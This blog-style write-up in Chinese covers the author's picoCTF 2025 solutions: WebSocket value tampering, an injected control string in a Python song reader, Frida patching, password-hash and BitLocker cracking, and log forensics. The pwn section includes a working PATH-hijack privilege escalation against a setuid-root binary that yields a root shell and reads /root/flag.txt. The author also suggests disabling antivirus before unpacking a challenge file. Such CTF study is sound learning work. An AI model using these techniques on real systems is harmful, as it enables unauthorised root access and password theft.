---
title: picoCTF 2025 - write-up
published: 2025-03-18
description: '紀錄在 picoCTF 2025 competition 中所解的題目'
image: 'image.jpg'
tags: [CTF,write-up,Cyber Secutity]
category: 'CTF'
draft: false
---

## Result

![image](https://hackmd.io/_uploads/BJXZ-U8nkx.png)
![image](https://hackmd.io/_uploads/HytzW8Ihke.png)


## Web

### WebSockFish 

這是一個西洋棋樣子的 web  
![image](https://hackmd.io/_uploads/BJUyz8Ln1g.png =80%x)

當下棋下爛掉的時候，可以發現他發送的 websocket 的 value 變大了 （下圖右邊的 ws eval value）
![image](https://hackmd.io/_uploads/BkYtzUI31g.png)
可以試試看，送出負的 value
```javascript
ws.send("eval -9999999");
```
![image](https://hackmd.io/_uploads/SkBCE8I2ke.png)


> picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_e5e75e69}

### Pachinko

這一題只能說，一點都看不懂他在幹嘛。
有空再來寫

> picoCTF{p4ch1nk0_f146_0n3_e947b9d7} 

## Crypto

### hashcrack

看題目就知道，題目跟 hash有關  
直接把 hash 值全部丟到 [這邊](https://crackstation.net/) 破解看看
![image](https://hackmd.io/_uploads/HkdK3U82kl.png)

> picoCTF{UseStr0nG_h@shEs_&PaSswDs!_ce730f64}


### Guess My Cheese (Part 1)

Hints: affinity for linear equations 
代表說這些 c （密文） 跟 p （明文） 之間有線性關係
先連上去看看
![image](https://hackmd.io/_uploads/SkoM4Md3kg.png)

這邊他有加密跟猜測兩個選項  
先試試看加密（這邊我拿 Swiss 做示範）
![image](https://hackmd.io/_uploads/B1vFEMO21e.png)

這樣就得到了 c 跟 p 
然後知道有線性關係，就可以解方程式
![image](https://hackmd.io/_uploads/SJ4ISMOnyx.png)

得出 A = 25 , B = 18
這樣就可以解密
![image](https://hackmd.io/_uploads/BJpurGunye.png)

> picoCTF{ChEeSy1ff8ae0d}

## Reverse

### Flag Hunters

```python=
import re
import time


# Read in flag from file
flag = open('flag.txt', 'r').read()

secret_intro = \
'''Pico warriors rising, puzzles laid bare,
Solving each challenge with precision and flair.
With unity and skill, flags we deliver,
The ether’s ours to conquer, '''\
+ flag + '\n'


song_flag_hunters = secret_intro +\
'''
# 歌詞部分省略
'''

MAX_LINES = 100

def reader(song, startLabel):
  lip = 0
  start = 0
  refrain = 0
  refrain_return = 0
  finished = False

  # Get list of lyric lines
  song_lines = song.splitlines()
  
  # Find startLabel, refrain and refrain return
  for i in range(0, len(song_lines)):
    if song_lines[i] == startLabel:
      start = i + 1
    elif song_lines[i] == '[REFRAIN]':
      refrain = i + 1
    elif song_lines[i] == 'RETURN':
      refrain_return = i

  # Print lyrics
  line_count = 0
  lip = start
  while not finished and line_count < MAX_LINES:
    line_count += 1
    for line in song_lines[lip].split(';'):
      if line == '' and song_lines[lip] != '':
        continue
      if line == 'REFRAIN':
        song_lines[refrain_return] = 'RETURN ' + str(lip + 1)
        lip = refrain
      elif re.match(r"CROWD.*", line):
        crowd = input('Crowd: ')
        song_lines[lip] = 'Crowd: ' + crowd
        lip += 1
      elif re.match(r"RETURN [0-9]+", line):
        lip = int(line.split()[1])
      elif line == 'END':
        finished = True
      else:
        print(line, flush=True)
        time.sleep(0.5)
        lip += 1

reader(song_flag_hunters, '[VERSE1]')

```
看到第 50 ~ 56 行的程式，我就想到好像可以利用這個邏輯漏洞去跳轉到 secret_intro 的部分
所以我輸入
```
REFRAIN;RETURN 0;
```
結果：
![image](https://hackmd.io/_uploads/Sk1FIM_21e.png)

> picoCTF{70637h3r_f0r3v3r_a3d964ee}

### Quantum Scrambler

這一題我利用~~工人智慧~~自己手動對出來Flag

> picoCTF{python_is_weirdf82598d6}

### Binary Instrumentation 1

Hints:
1. Frida is an easy-to-install, lightweight binary instrumentation toolkit
2. Try using the CLI tools like frida-trace to auto-generate handlers

這一題就是要使用 Frida 這個工具會比較好解
然後解壓縮以前可以先把 Windows 的即時防毒關掉
才不會導致題目檔案被殺
先執行看看
![image](https://hackmd.io/_uploads/HkKTOzu2Jl.png)
看起來是要修改跟 Sleep 函式相關的東西
這時候可以用 Frida 來逆向 
```python
frida-trace -f bininst1.exe -i "Sleep"
```
就會給你一串網址，連進去後就會像這樣
![image](https://hackmd.io/_uploads/rJseqMd2Jg.png)
這時候可以 Patch 他的函數，像這樣
![image](https://hackmd.io/_uploads/B1cm9zO31x.png)
然後要按下上方的 `Deploy` 鍵
之後就要重新運行程式，也是用 Firda
![image](https://hackmd.io/_uploads/Sk4Rqzunyg.png)
拿去 Decode 
![image](https://hackmd.io/_uploads/BJTgsfO2yg.png)

> picoCTF{w4ke_m3_up_w1th_fr1da_f27acc38}

## Forensics

### RED

Hints:
1. The picture seems pure, but is it though?
2. Red?Ged?Bed?Aed?
3. Check whatever Facebook is called now.

利用 exiftool 查看 Metadata
![image](https://hackmd.io/_uploads/S1tUozOhyx.png)

查看過後發現疑似是詩的東西
```
Crimson heart, vibrant and bold,.
Hearts flutter at your sight..
Evenings glow softly red,.
Cherries burst with sweet life..
Kisses linger with your warmth..
Love deep as merlot..
Scarlet leaves falling softly,.
Bold in every stroke.
```
發現是藏頭
```
check LSB 
```
我使用 zsteg 來檢查，發現了奇怪的東西
![image](https://hackmd.io/_uploads/SkXqoMOnJg.png)
拿去 base64 解碼
![image](https://hackmd.io/_uploads/SJQhofuh1x.png)

> picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}

### Ph4nt0m 1ntrud3r

Hints:
1. Filter your packets to narrow down your search.
2. Attacks were done in timely manner.
3. Time is essential

首先，先把封包利用時間排序
![image](https://hackmd.io/_uploads/SkSs2Gdnkx.png)

然後看到有幾個封包長度不太一樣，就把他們找出來做解碼

```python
import base64

encoded_strings = [
    "cGljb0NURg==",
    "ezF0X3c0cw==",
    "bnRfdGg0dA==",
    "XzM0c3lfdA==", 
    "YmhfNHJfZQ==",
    "NWU4Yzc4ZA==",
    "fQ==",
]

flag = ""

decoded_strings = []
for enc in encoded_strings:
    try:
        decoded = base64.b64decode(enc).decode("utf-8")
        decoded_strings.append(decoded)
    except Exception:
        decoded_strings.append(f"Error decoding: {enc}")

for decoded in decoded_strings:
    flag += decoded
print(flag)
```

> picoCTF{1t_w4snt_th4t_34sy_tbh_4r_e5e8c78d}

### Event-Viewing

這題要我們找以下三個條件的 Logs

1. They `installed software using an installer` they downloaded online
2. They `ran the installed software` but it seemed to do nothing
3. Now every time they `bootup and login` to their computer, a `black command prompt screen quickly opens and closes` and their computer shuts down instantly.

Hints:
1. Try to filter the logs with the right event ID
2. What could the software have done when it was ran that causes the shutdowns every time the system starts up?

然後分別用這幾個條件去搜尋 event ID 過濾 Logs
最後找到了 1074, 1033, 4657 分別有奇怪的東西

![image](https://hackmd.io/_uploads/r1UtAz_nkx.png)
![image](https://hackmd.io/_uploads/rJd50zOh1g.png)
![image](https://hackmd.io/_uploads/B16T1Xu2Jx.png)

拿去解碼

![image](https://hackmd.io/_uploads/rk9zlXunyx.png)


> picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}

### Bitlocker-1
Hints:
1. Hash cracking

題目要我們破解 Bitlocker 的密碼
這邊利用 John 去爆破 hash
![image](https://hackmd.io/_uploads/HydCXXd2Je.png)
![image](https://hackmd.io/_uploads/r12147Ohke.png)

再利用 hashcat 破密

![image](https://hackmd.io/_uploads/HJgfN7_31e.png)

最後掛載檔案 拿到 Flag
要記得因為是 Windows ，所以要載 ntfs-3g 套件
![image](https://hackmd.io/_uploads/rk3I6Ed2yl.png)


> picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_3242adb1}

## Pwn

### PIE TIME

他是有一個 PIE 保護的檔案
可以先透過 gdb 分析
main address - offset = win function address
之後輸入後就可以獲取 Flag

> picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_93dd5fcb}

### hash-only-1

經典的 Privilege Escalation 
首先可以用 IDA 靜態逆向觀察
可以發現以下的 code
```cpp 
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(
    v13,
    "/bin/bash -c 'md5sum /root/flag.txt'",
    &v11);
...
  setgid(0);
  setuid(0);
...
v12 = system(v5);
```
然後發現了執行檔的權限控制如下
```
-rwsr-xr-x 1 root root 18312 Mar  6 03:45 flaghasher
```

代表說 一般 user 執行這個檔案 是利用 root 權限
我們可以嘗試利用環境變數來替換掉 system() 執行的命令
```shell
echo -e '#!/bin/bash\n/bin/bash' > /tmp/md5sum
chmod +x /tmp/md5sum
export PATH=/tmp:$PATH
./flaghasher
```

這樣我們可以順利取得 root shell ，然後 get flag
```
cat /root/flag.txt
```
> picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_9722baa4}

### hash-only-2

跟上個題目一樣，只是初始的 bash 換成了 rbash
所以可以先切換 bash
```
/bin/bash
```
之後的流程都一樣
> picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_aeecb174} 